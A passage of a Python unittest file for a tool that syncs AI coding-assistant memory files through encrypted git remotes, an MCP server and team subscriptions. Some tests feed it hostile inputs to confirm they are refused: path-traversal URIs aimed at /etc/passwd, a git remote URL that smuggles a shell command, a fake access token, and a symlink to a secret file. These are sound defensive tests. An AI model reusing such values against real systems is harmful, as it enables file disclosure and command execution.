        self.assertEqual((pb / "CLAUDE.md").read_text(), "# rules\n- secret sauce: use tabs\n")

        # concurrent appends still union-merge (merges happen locally, in plain text)
        (pa / "CLAUDE.md").write_text((pa / "CLAUDE.md").read_text() + "- from A\n")
        (pb / "CLAUDE.md").write_text((pb / "CLAUDE.md").read_text() + "- from B\n")
        a.sync()
        b.sync()
        a.sync()
        for p in (pa, pb):
            self.assertIn("- from A", (p / "CLAUDE.md").read_text())
            self.assertIn("- from B", (p / "CLAUDE.md").read_text())
        count = subprocess.run(["git", "--git-dir", str(self.remote), "rev-list", "--count", "main"],
                               capture_output=True, text=True).stdout.strip()
        self.assertEqual(count, "1")  # one encrypted file, replaced on every push; history is inside it
        self.assertIn(sid, [x for _, x in [(0, s) for s in b.satellites()]])

    def test_lease_protects_a_concurrent_push(self):
        a, pa = self.machine("a")
        (pa / "CLAUDE.md").write_text("base\n")
        a.track(pa)
        self.crypt(a).setup(str(self.remote))
        a.sync()
        b, pb = self.machine("b", join=True)
        b.track(pb)
        b.sync()
        c = self.crypt(a)
        stale = c.remote_head()
        (pb / "CLAUDE.md").write_text("base\n- b\n")
        b.sync()
        a.save()
        self.assertFalse(c.push(expected=stale))  # remote moved since `stale`: refused, nothing lost
        a.sync()
        self.assertIn("- b", (pa / "CLAUDE.md").read_text())

    def test_a_refused_push_is_merged_and_retried(self):
        from unittest import mock

        from punk_records.crypt import Crypt
        a, pa = self.machine("a")
        (pa / "CLAUDE.md").write_text("base\n")
        a.track(pa)
        self.crypt(a).setup(str(self.remote))
        a.sync()
        b, pb = self.machine("b", join=True)
        b.track(pb)
        b.sync()
        (pa / "CLAUDE.md").write_text("base\n- from A\n")
        (pb / "CLAUDE.md").write_text("base\n- from B\n")
        real_push, raced = Crypt.push, []

        def push(crypt, expected):
            if crypt.store.root == b.root and not raced:
                raced.append(True)
                a.sync()  # A pushes between B's merge and B's push
            return real_push(crypt, expected)

        with mock.patch.object(Crypt, "push", push):
            b.sync()
        self.assertEqual(raced, [True])
        a.sync()
        for p in (pa, pb):
            self.assertIn("- from A", (p / "CLAUDE.md").read_text())
            self.assertIn("- from B", (p / "CLAUDE.md").read_text())

    def test_plain_remote_is_refused_when_encrypted(self):
        a, pa = self.machine("a")
        (pa / "CLAUDE.md").write_text("x\n")
        a.track(pa)
        self.crypt(a).setup(str(self.remote))
        plain = self.tmp / "plain.git"
        git("init", "-q", "--bare", str(plain), cwd=self.tmp)
        git("remote", "add", "origin", str(plain), cwd=a.root)
        with self.assertRaises(PunkError) as e:
            a.sync()
        self.assertIn("unencrypted", str(e.exception))
        self.assertNotEqual(subprocess.run(["git", "--git-dir", str(plain), "rev-parse", "main"],
                                           capture_output=True).returncode, 0)  # nothing was pushed in plain

    def test_setup_refuses_a_store_with_a_plain_remote(self):
        a, _ = self.machine("a")
        git("remote", "add", "origin", str(self.tmp / "plain.git"), cwd=a.root)
        with self.assertRaises(PunkError):
            self.crypt(a).setup(str(self.remote))

    def test_wrong_key_and_recipients(self):
        a, pa = self.machine("a")
        (pa / "CLAUDE.md").write_text("x\n")
        a.track(pa)
        self.crypt(a).setup(str(self.remote))
        a.sync()
        key_b = self.tmp / "keys" / "b.key"
        os.environ["PUNK_AGE_KEY"] = str(key_b)
        with self.assertRaises(PunkError) as e:
            self.machine("b", join=True)
        self.assertIn("add-recipient", str(e.exception))
        b = Store(self.tmp / "b-store")
        pub_b = self.crypt(b).public_key()
        self.assertTrue(pub_b.startswith("age1"))
        os.environ["PUNK_AGE_KEY"] = str(self.key_a)
        with self.assertRaises(PunkError):
            self.crypt(a).add_recipient("age1notarealkey")
        self.crypt(a).add_recipient(pub_b)
        a.sync()  # now encrypted to A's and B's keys
        os.environ["PUNK_AGE_KEY"] = str(key_b)
        self.assertFalse(b.root.exists())  # the failed join cleaned up after itself
        b2, pb = self.machine("b", join=True)
        b2.track(pb)
        b2.sync()
        self.assertEqual((pb / "CLAUDE.md").read_text(), "x\n")

    def test_tampered_remote_leaves_the_store_alone(self):
        a, pa = self.machine("a")
        (pa / "CLAUDE.md").write_text("x\n")
        a.track(pa)
        self.crypt(a).setup(str(self.remote))
        a.sync()
        head = a.git("rev-parse", "HEAD").stdout
        evil = self.tmp / "evil"
        git("clone", "-q", "-b", "main", str(self.remote), str(evil), cwd=self.tmp)
        (evil / "punk-records.bundle.age").write_bytes(b"not an age file")
        git("commit", "-qam", "evil", cwd=evil)
        git("push", "-q", "origin", "main", cwd=evil)
        with self.assertRaises(PunkError) as e:
            a.sync()
        self.assertIn("decrypt", str(e.exception))
        self.assertEqual(a.git("rev-parse", "HEAD").stdout, head)

    def test_hooks_use_the_encrypted_remote(self):
        a, pa = self.machine("a")
        (pa / "CLAUDE.md").write_text("from a session\n")
        a.track(pa)
        self.crypt(a).setup(str(self.remote))
        from punk_records import hooks
        code, _, err = hooks.run(a, "session-end", json.dumps({"cwd": str(pa)}))
        self.assertEqual(code, 0, err)
        self.assertEqual(self.remote_files(), ["punk-records.bundle.age"])

    def test_missing_age_needs_a_person(self):
        """#49, #50: without age on PATH, start restores from the local store and end saves locally;
        both say so and exit 2, and `punk sync` stops with a clear error, never a traceback."""
        a, pa = self.machine("a")
        (pa / "CLAUDE.md").write_text("from a\n")
        sid = a.track(pa)
        self.crypt(a).setup(str(self.remote))
        a.sync()
        git_dir = Path(shutil.which("git")).parent
        if shutil.which("age", path=str(git_dir)):  # e.g. both in /opt/homebrew/bin: link git alone
            bin_dir = self.tmp / "bin-without-age"
            bin_dir.mkdir()
            (bin_dir / "git").symlink_to(shutil.which("git"))
        else:  # git's own folder keeps what it needs next to it (Windows: git.exe and its DLLs)
            bin_dir = git_dir
        self.assertIsNone(shutil.which("age", path=str(bin_dir)))
        env = {**os.environ, "PATH": str(bin_dir), "PYTHONPATH": str(ROOT / "src")}

        def punk(*args):
            r = subprocess.run([sys.executable, "-m", "punk_records", "--home", str(a.root), *args],
                               capture_output=True, text=True, env=env)
            return r.returncode, r.stderr

        code, err = punk("session", "start", "--project", str(pa))
        self.assertEqual(code, 2, err)
        self.assertIn("encryption needs age on PATH", err)
        self.assertNotIn("Errno", err)
        (pa / "CLAUDE.md").write_text("from a\nedited\n")
        code, err = punk("session", "end", "--project", str(pa))
        self.assertEqual(code, 2, err)
        self.assertIn("saved locally but not shared: encryption needs age on PATH", err)
        self.assertIn("edited", (a.root / "records" / sid / "CLAUDE.md").read_text())
        code, err = punk("sync")
        self.assertEqual(code, 2, err)
        self.assertIn("encryption needs age on PATH", err)
        self.assertNotIn("Traceback", err)

    def test_cli(self):
        from contextlib import redirect_stderr, redirect_stdout
        from io import StringIO

        def run(*args):
            out, err = StringIO(), StringIO()
            with redirect_stdout(out), redirect_stderr(err):
                code = cli.main(["--home", str(self.tmp / "cli-store"), *args])
            return code, out.getvalue(), err.getvalue()

        self.assertEqual(run("init", "--no-global")[0], 0)
        code, out, _ = run("encrypt", "init", str(self.remote))
        self.assertEqual(code, 0)
        self.assertIn("age1", out)
        self.assertIn(str(self.key_a), out)
        code, out, _ = run("encrypt", "status")
        self.assertIn(str(self.remote), out)
        self.assertIn("age1", out)
        code, out, _ = run("status")
        self.assertIn("encrypted", out)
        self.assertEqual(run("encrypt", "add-recipient", "nope")[0], 2)


MODERN = {"io.modelcontextprotocol/protocolVersion": "2026-07-28",
          "io.modelcontextprotocol/clientInfo": {"name": "test", "version": "1"},
          "io.modelcontextprotocol/clientCapabilities": {}}


class TestMCPProtocol(Base):
    def setUp(self):
        super().setUp()
        self.store = Store(self.tmp / "s")
        self.store.init(track_global=False)
        self.p = self.project("app")
        (self.p / "CLAUDE.md").write_text("# rules\n- tabs\n")
        self.sid = self.store.track(self.p)
        self.store.save()

    def rpc(self, method, params=None, modern=False, allow_sync=False):
        params = dict(params or {})
        if modern:
            params["_meta"] = dict(MODERN)
        return handle(self.store, {"jsonrpc": "2.0", "id": 7, "method": method, "params": params},
                      allow_sync=allow_sync)

    def tool(self, name, **args):
        r = self.rpc("tools/call", {"name": name, "arguments": args})["result"]
        return [c["text"] for c in r["content"]], r["isError"]

    def test_legacy_initialize_negotiates_a_supported_version(self):
        r = self.rpc("initialize", {"protocolVersion": "2025-06-18"})["result"]
        self.assertEqual(r["protocolVersion"], "2025-06-18")
        self.assertEqual(set(r["capabilities"]), {"tools", "resources", "prompts"})
        r = self.rpc("initialize", {"protocolVersion": "1999-01-01"})["result"]
        self.assertEqual(r["protocolVersion"], "2025-11-25")  # newest legacy version, not an echo

    def test_modern_discover_and_version_checks(self):
        r = self.rpc("server/discover", modern=True)["result"]
        self.assertEqual(r["resultType"], "complete")
        self.assertEqual(r["supportedVersions"], ["2026-07-28"])
        self.assertEqual(r["_meta"]["io.modelcontextprotocol/serverInfo"]["name"], "punk-records")
        self.assertIn("prompts", r["capabilities"])
        r = self.rpc("tools/list", modern=True)["result"]
        self.assertEqual(r["resultType"], "complete")
        bad = handle(self.store, {"jsonrpc": "2.0", "id": 1, "method": "tools/list", "params": {"_meta": {
            **MODERN, "io.modelcontextprotocol/protocolVersion": "2099-01-01"}}})
        self.assertEqual(bad["error"]["code"], -32022)
        self.assertEqual(bad["error"]["data"], {"supported": ["2026-07-28"], "requested": "2099-01-01"})
        meta = dict(MODERN)
        del meta["io.modelcontextprotocol/clientCapabilities"]
        bad = handle(self.store, {"jsonrpc": "2.0", "id": 1, "method": "tools/list", "params": {"_meta": meta}})
        self.assertEqual(bad["error"]["code"], -32602)

    def test_resources_list_and_read(self):
        (self.store.records / self.sid / ".claude").mkdir()
        (self.store.records / self.sid / ".claude" / "napkin.md").write_text("napkin\n")
        self.store.commit("napkin")
        res = self.rpc("resources/list")["result"]["resources"]
        uris = {r["name"]: r["uri"] for r in res}
        self.assertEqual(uris[f"{self.sid}/CLAUDE.md"], "punk-records:///github.com%2Fme%2Fapp/CLAUDE.md")
        self.assertEqual(uris[f"{self.sid}/.claude/napkin.md"],
                         "punk-records:///github.com%2Fme%2Fapp/.claude/napkin.md")
        self.assertEqual({r["mimeType"] for r in res}, {"text/markdown"})
        c = self.rpc("resources/read", {"uri": uris[f"{self.sid}/CLAUDE.md"]})["result"]["contents"]
        self.assertEqual(c, [{"uri": uris[f"{self.sid}/CLAUDE.md"], "mimeType": "text/markdown",
                              "text": "# rules\n- tabs\n"}])
        self.assertEqual(self.rpc("resources/read", {"uri": "punk-records:///github.com%2Fme%2Fapp/nope.md"})
                         ["error"]["code"], -32002)  # legacy not-found code
        self.assertEqual(self.rpc("resources/read", {"uri": "punk-records:///github.com%2Fme%2Fapp/nope.md"},
                                  modern=True)["error"]["code"], -32602)
        for evil in ("punk-records:///github.com%2Fme%2Fapp/../../../etc/passwd",
                     "punk-records:///..%2F..%2Fetc/passwd", "file:///etc/passwd",
                     "punk-records:///github.com%2Fme%2Fapp/%2E%2E/%2E%2E/punk-state.json"):
            self.assertIn("error", self.rpc("resources/read", {"uri": evil}), evil)

    def test_resource_uris_reject_path_tricks_on_their_own(self):
        from punk_records.mcp import parse_uri, resource_uri
        self.assertEqual(parse_uri(resource_uri("github.com/me/app", ".claude/napkin.md")),
                         ("github.com/me/app", ".claude/napkin.md"))
        for evil in ("punk-records:///github.com%2Fme%2Fapp/../x.md", "punk-records:///github.com%2Fme%2Fapp/a/%2E%2E/x.md",
                     "punk-records:///..%2Fsecret/CLAUDE.md", "punk-records:///github.com%2Fme%2Fapp//etc/passwd",
                     "punk-records://host/sid/CLAUDE.md", "punk-records:///sid", "https://x/CLAUDE.md"):
            with self.assertRaises(PunkError, msg=evil):
                parse_uri(evil)

    def test_resources_are_paged(self):
        from unittest import mock
        for name in ("AGENTS.md", "GEMINI.md"):
            (self.store.records / self.sid / name).write_text("x\n")
        self.store.commit("more")
        with mock.patch("punk_records.mcp.PAGE_SIZE", 2):
            first = self.rpc("resources/list")["result"]
            second = self.rpc("resources/list", {"cursor": first["nextCursor"]})["result"]
        self.assertEqual(len(first["resources"]), 2)
        self.assertEqual(len(second["resources"]), 1)
        self.assertNotIn("nextCursor", second)
        self.assertIn("error", self.rpc("resources/list", {"cursor": "not-a-cursor"}))
        self.assertIn("error", self.rpc("resources/list", {"cursor": "-1"}))

    def test_context_prompt(self):
        prompts = self.rpc("prompts/list")["result"]["prompts"]
        self.assertEqual([p["name"] for p in prompts], ["punk-context"])
        r = self.rpc("prompts/get", {"name": "punk-context", "arguments": {"cwd": str(self.p)}})["result"]
        self.assertEqual(r["messages"][0]["role"], "user")
        self.assertIn("- tabs", r["messages"][0]["content"]["text"])
        os.environ["CLAUDE_PROJECT_DIR"] = str(self.p)  # what Claude Code sets for stdio servers
        r = self.rpc("prompts/get", {"name": "punk-context"})["result"]
        self.assertIn("- tabs", r["messages"][0]["content"]["text"])
        text, err = self.tool("get_context")
        self.assertFalse(err)
        self.assertIn("- tabs", text[0])
        self.assertEqual(self.rpc("prompts/get", {"name": "nope"})["error"]["code"], -32602)

    def test_write_memory_with_conflict_checks(self):
        text, err = self.tool("read_memory", satellite=self.sid, path="CLAUDE.md")
        self.assertFalse(err)
        self.assertEqual(text[0], "# rules\n- tabs\n")
        base = text[1].split("sha256=")[1].split(";")[0]
        # existing file without base: refused
        text, err = self.tool("write_memory", satellite=self.sid, path="CLAUDE.md", content="x\n")
        self.assertTrue(err)
        self.assertIn("read_memory", text[0])
        # correct base: written to the store and the project
        text, err = self.tool("write_memory", satellite=self.sid, path="CLAUDE.md",
                              content="# rules\n- spaces\n", base_sha256=base)
        self.assertFalse(err, text)
        self.assertEqual((self.p / "CLAUDE.md").read_text(), "# rules\n- spaces\n")
        # the same (now stale) base again: conflict, nothing changed
        text, err = self.tool("write_memory", satellite=self.sid, path="CLAUDE.md", content="y\n", base_sha256=base)
        self.assertTrue(err)
        self.assertIn("changed", text[0])
        self.assertEqual((self.p / "CLAUDE.md").read_text(), "# rules\n- spaces\n")
        # a new file needs no base
        text, err = self.tool("write_memory", satellite=self.sid, path="napkin.md", content="new\n")
        self.assertFalse(err, text)
        self.assertEqual((self.p / "napkin.md").read_text(), "new\n")
        # secrets and non-memory paths are refused
        self.assertTrue(self.tool("write_memory", satellite=self.sid, path="AGENTS.md",
                                  content="key ghp_" + "a" * 36 + "\n")[1])
        self.assertTrue(self.tool("write_memory", satellite=self.sid, path="run.sh", content="x")[1])

    def test_write_memory_refuses_over_unsaved_local_edits(self):
        base = self.tool("read_memory", satellite=self.sid, path="CLAUDE.md")[0][1].split("sha256=")[1].split(";")[0]
        (self.p / "CLAUDE.md").write_text("# rules\n- tabs\n- my unsaved edit\n")
        text, err = self.tool("write_memory", satellite=self.sid, path="CLAUDE.md", content="z\n", base_sha256=base)
        self.assertTrue(err)
        self.assertIn("unsaved", text[0])
        self.assertEqual((self.p / "CLAUDE.md").read_text(), "# rules\n- tabs\n- my unsaved edit\n")

    def test_write_memory_keeps_crlf_files_crlf(self):
        (self.p / "CLAUDE.md").write_bytes(b"a\r\nb\r\n")
        self.store.save()
        base = self.tool("read_memory", satellite=self.sid, path="CLAUDE.md")[0][1].split("sha256=")[1].split(";")[0]
        self.tool("write_memory", satellite=self.sid, path="CLAUDE.md", content="a\nc\n", base_sha256=base)
        self.assertEqual((self.p / "CLAUDE.md").read_bytes(), b"a\r\nc\r\n")

    def test_sync_is_opt_in(self):
        names = [t["name"] for t in self.rpc("tools/list")["result"]["tools"]]
        self.assertNotIn("sync", names)
        self.assertIn("write_memory", names)
        text, err = self.tool("sync")
        self.assertTrue(err)
        self.assertIn("--allow-sync", text[0])
        names = [t["name"] for t in self.rpc("tools/list", allow_sync=True)["result"]["tools"]]
        self.assertIn("sync", names)
        r = self.rpc("tools/call", {"name": "sync", "arguments": {}}, allow_sync=True)["result"]
        self.assertFalse(r["isError"])


class TestTeamBrain(Base):
    def setUp(self):
        super().setUp()
        # the team's store: org-wide rules plus notes for the same app
        self.team = Store(self.tmp / "team-store")
        self.team.init(machine="team", track_global=False)
        for sid, rel, text in (("global", ".claude/CLAUDE.md", "- team: write tests first\n"),
                               ("github.com/me/app", "CLAUDE.md", "- team: deploy with make ship\n")):
            f = self.team.records / sid / rel
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text(text)
        sat = self.team.root / "satellites" / "github.com" / "me"
        sat.mkdir(parents=True)
        (sat / "app.json").write_text('{"name": "app", "kind": "project"}\n')  # as `punk track` writes it
        self.team.commit("team conventions")
        # my store and project
        self.store = Store(self.tmp / "s")
        self.store.init(track_global=False)
        self.p = self.project("app")
        (self.p / "CLAUDE.md").write_text("- me: tabs\n")
        self.sid = self.store.track(self.p)
        self.store.save()

    def team_brain(self):
        from punk_records.team import Team
        return Team(self.store)

    def test_context_includes_team_memories_read_only(self):
        self.team_brain().subscribe("acme", str(self.team.root))
        before = self.store.git("rev-parse", "HEAD").stdout
        ctx = self.store.context(self.p)
        order = [ctx.index(x) for x in ("- team: write tests first", "- team: deploy with make ship", "- me: tabs")]
        self.assertEqual(order, sorted(order))  # team general, then team project notes, then mine last
        self.assertLess(ctx.index("- team: deploy with make ship"), ctx.index("- me: tabs"))
        self.assertIn("@acme/github.com/me/app/CLAUDE.md", ctx)
        self.assertIn("read-only", ctx)
        # never written anywhere: not into my records, not into the project, no commit
        self.assertEqual(self.store.git("rev-parse", "HEAD").stdout, before)
        self.assertFalse((self.store.records / "global").exists())
        self.assertEqual(self.store.restore(), [])
        self.assertEqual((self.p / "CLAUDE.md").read_text(), "- me: tabs\n")
        self.assertEqual(self.store.save(), [])

    def test_team_notes_apply_to_projects_you_do_not_track(self):
        self.team_brain().subscribe("acme", str(self.team.root))
        self.store.untrack(self.sid, purge=True)
        ctx = self.store.context(self.p)  # matched by the checkout's git remote
        self.assertIn("- team: deploy with make ship", ctx)
        self.assertNotIn("- me: tabs", ctx)

    def test_search_labels_team_hits(self):
        self.team_brain().subscribe("acme", str(self.team.root))
        hits = [(s, r) for s, r, _, _ in self.store.search("make ship")]
        self.assertEqual(hits, [("@acme/github.com/me/app", "CLAUDE.md")])

    def test_sync_updates_subscriptions(self):
        self.team_brain().subscribe("acme", str(self.team.root))
        f = self.team.records / "global" / ".claude" / "CLAUDE.md"
        f.write_text(f.read_text() + "- team: no force pushes\n")
        self.team.commit("new rule")
        self.assertNotIn("no force pushes", self.store.context(self.p))
        self.store.sync()
        self.assertIn("no force pushes", self.store.context(self.p))

    def test_unreachable_subscription_never_blocks_sync(self):
        self.team_brain().subscribe("acme", str(self.team.root))
        import shutil
        shutil.move(str(self.team.root), str(self.tmp / "moved"))
        (self.p / "CLAUDE.md").write_text("- me: tabs\n- me: more\n")
        acts = self.store.sync()
        self.assertIn(("update", "CLAUDE.md"), [(a.kind, a.rel) for a in acts])
        self.assertTrue(any(a.sat == "@acme" and a.kind == "skipped" for a in acts), acts)
        self.assertIn("- team: write tests first", self.store.context(self.p))  # last fetched copy still used

    def test_subscribe_validation(self):
        t = self.team_brain()
        for name, url in (("acme", "ext::sh -c touch% /tmp/pwned"), ("acme", "fd::7"),
                          ("Bad Name", str(self.team.root)), ("../x", str(self.team.root))):
            with self.assertRaises(PunkError, msg=(name, url)):
                t.subscribe(name, url)
        plain = self.tmp / "plain"
        plain.mkdir()
        git("init", "-q", str(plain), cwd=self.tmp)
        (plain / "README.md").write_text("x")
        git("add", "-A", cwd=plain)
        git("commit", "-qm", "x", cwd=plain)
        with self.assertRaises(PunkError) as e:
            t.subscribe("plain", str(plain))
        self.assertIn("not a Punk Records store", str(e.exception))
        self.assertEqual(t.names(), [])
        t.subscribe("acme", str(self.team.root))
        with self.assertRaises(PunkError):
            t.subscribe("acme", str(self.team.root))
        t.unsubscribe("acme")
        self.assertEqual(t.names(), [])
        self.assertNotIn("team:", self.store.context(self.p))

    @unittest.skipUnless(can_symlink(), "symlinks not supported here")
    def test_hostile_team_store_cannot_reach_outside(self):
        (self.tmp / "secret.txt").write_text("my private key\n")
        os.symlink(str(self.tmp / "secret.txt"), self.team.records / "global" / "CLAUDE.md")
        big = self.team.records / "global" / "AGENTS.md"
        big.write_text("x" * 2_000_000)
        self.team.commit("hostile")
        self.team_brain().subscribe("acme", str(self.team.root))
        ctx = self.store.context(self.p)
        self.assertNotIn("my private key", ctx)  # symlink entries are ignored, never followed
        self.assertNotIn(str(self.tmp / "secret.txt"), ctx)  # not even the link's target path
        self.assertNotIn("x" * 1000, ctx)  # oversized files skipped
        self.assertFalse(any(self.store.records.rglob("*secret*")))

    def test_mcp_and_cli(self):
        from contextlib import redirect_stdout
        from io import StringIO
        out = StringIO()
        with redirect_stdout(out):
            self.assertEqual(cli.main(["--home", str(self.store.root), "subscribe", "acme", str(self.team.root)]), 0)
            self.assertEqual(cli.main(["--home", str(self.store.root), "subscriptions"]), 0)
        self.assertIn("acme", out.getvalue())
        self.assertIn(str(self.team.root), out.getvalue())
        r = handle(self.store, {"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                                "params": {"name": "get_context", "arguments": {"cwd": str(self.p)}}})
        self.assertIn("make ship", r["result"]["content"][0]["text"])
        with redirect_stdout(StringIO()):
            self.assertEqual(cli.main(["--home", str(self.store.root), "unsubscribe", "acme"]), 0)
        self.assertEqual(cli.main(["--home", str(self.store.root), "unsubscribe", "acme"]), 2)

    def test_session_start_hook_updates_subscriptions(self):
        from punk_records import hooks
        self.team_brain().subscribe("acme", str(self.team.root))
        f = self.team.records / "global" / ".claude" / "CLAUDE.md"
        f.write_text(f.read_text() + "- team: hook fetched this\n")
        self.team.commit("new")
        code, out, _ = hooks.run(self.store, "session-start", json.dumps({"cwd": str(self.p)}))
        self.assertEqual((code, out), (0, ""))
        self.assertIn("hook fetched this", self.store.context(self.p))


class TestRoughEdges(Base):
    def run_cli(self, *args):
        from contextlib import redirect_stderr, redirect_stdout
        from io import StringIO
        out, err = StringIO(), StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            code = cli.main(["--home", str(self.tmp / "s"), *args])
        return code, out.getvalue(), err.getvalue()

    def test_git_passes_every_argument_to_git(self):
        from unittest import mock
        Store(self.tmp / "s").init(track_global=False)
        with mock.patch("punk_records.cli.subprocess.call", return_value=0) as call:
            self.assertEqual(self.run_cli("git", "--help")[0], 0)
            self.assertEqual(call.call_args[0][0][-1:], ["--help"])
            self.run_cli("git", "log", "-1", "--format=%s")
            self.assertEqual(call.call_args[0][0][-3:], ["log", "-1", "--format=%s"])
        with mock.patch("punk_records.cli.subprocess.call", return_value=0) as call:
            cli.main([f"--home={self.tmp / 's'}", "git", "-h"])
            self.assertEqual(call.call_args[0][0][-1:], ["-h"])

    def test_track_warns_about_huge_folders(self):
        from unittest import mock
        Store(self.tmp / "s").init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("x\n")
        for i in range(30):
            (p / f"f{i}.txt").write_text("x")
        code, _, err = self.run_cli("track", str(p))
        self.assertEqual((code, err), (0, ""))  # a normal project: no warning
        big = self.project("big", remote="git@github.com:me/big.git")
        for i in range(30):
            (big / f"f{i}.txt").write_text("x")
        with mock.patch("punk_records.cli.HUGE_FOLDER", 20):
            code, out, err = self.run_cli("track", str(big))
        self.assertEqual(code, 0)  # still tracked: a warning, not a refusal
        self.assertIn("tracking", out)
        self.assertIn("more than 20 files", err)

    def test_track_warns_about_the_home_folder(self):
        Store(self.tmp / "s").init(track_global=False)
        code, _, err = self.run_cli("track", os.environ["HOME"])
        self.assertEqual(code, 0)
        self.assertIn("home folder", err)


class TestJsonOutput(Base):
    """Machine-readable output for editor integrations (the VS Code extension)."""

    def setUp(self):
        super().setUp()
        self.store = Store(self.tmp / "s")
        self.store.init(track_global=False)
        self.p = self.project("app")
        (self.p / "CLAUDE.md").write_text("v1\n")
        self.sid = self.store.track(self.p)
        self.store.save()

    def run_cli(self, *args):
        from contextlib import redirect_stderr, redirect_stdout
        from io import StringIO
        out, err = StringIO(), StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            code = cli.main(["--home", str(self.store.root), *args])
        return code, out.getvalue(), err.getvalue()

    def test_status_json(self):
        code, out, _ = self.run_cli("status", "--json")
        self.assertEqual(code, 0)
        data = json.loads(out)
        self.assertEqual(data["version"], 1)
        self.assertEqual((data["save"], data["restore"], data["remote"]), ([], [], None))
        (self.p / "CLAUDE.md").write_text("v2\n")
        (self.store.records / self.sid / "napkin.md").write_text("from elsewhere\n")
        self.store.commit("other machine")
        data = json.loads(self.run_cli("status", "--json")[1])
        self.assertEqual(data["save"], [{"kind": "update", "satellite": self.sid, "path": "CLAUDE.md", "note": ""}])
        self.assertEqual(data["restore"], [{"kind": "add", "satellite": self.sid, "path": "napkin.md", "note": ""}])
        remote = self.tmp / "remote.git"
        git("init", "-q", "--bare", str(remote), cwd=self.tmp)
        git("remote", "add", "origin", str(remote), cwd=self.store.root)
        self.assertEqual(json.loads(self.run_cli("status", "--json")[1])["remote"],
                         {"kind": "git", "url": str(remote)})

    def test_list_json(self):
        team = Store(self.tmp / "team")
        team.init(machine="team", track_global=False)
        (team.records / "global").mkdir(parents=True)
        (team.records / "global" / "CLAUDE.md").write_text("- team rule\n")
        team.commit("team")
        from punk_records.team import Team
        Team(self.store).subscribe("acme", str(team.root))
        code, out, _ = self.run_cli("list", "--json")
        self.assertEqual(code, 0)
        data = json.loads(out)
        self.assertEqual(data["version"], 1)
        self.assertEqual(data["satellites"], [{"id": self.sid, "kind": "project", "name": "app",
                                               "local_path": str(self.p.resolve()), "memories": ["CLAUDE.md"]}])
        self.assertEqual(data["subscriptions"], [{"name": "acme", "url": str(team.root),
                                                  "satellites": [{"id": "global", "memories": ["CLAUDE.md"]}]}])

    def test_show_reads_team_memories(self):
        team = Store(self.tmp / "team")
        team.init(machine="team", track_global=False)
        (team.records / "global").mkdir(parents=True)
        (team.records / "global" / "CLAUDE.md").write_text("- team rule\n")
        team.commit("team")
        from punk_records.team import Team
        Team(self.store).subscribe("acme", str(team.root))
        self.assertEqual(self.run_cli("show", "@acme/global", "CLAUDE.md")[:2], (0, "- team rule\n"))
        self.assertEqual(self.run_cli("show", "@nope/global", "CLAUDE.md")[0], 2)


if __name__ == "__main__":
    unittest.main()
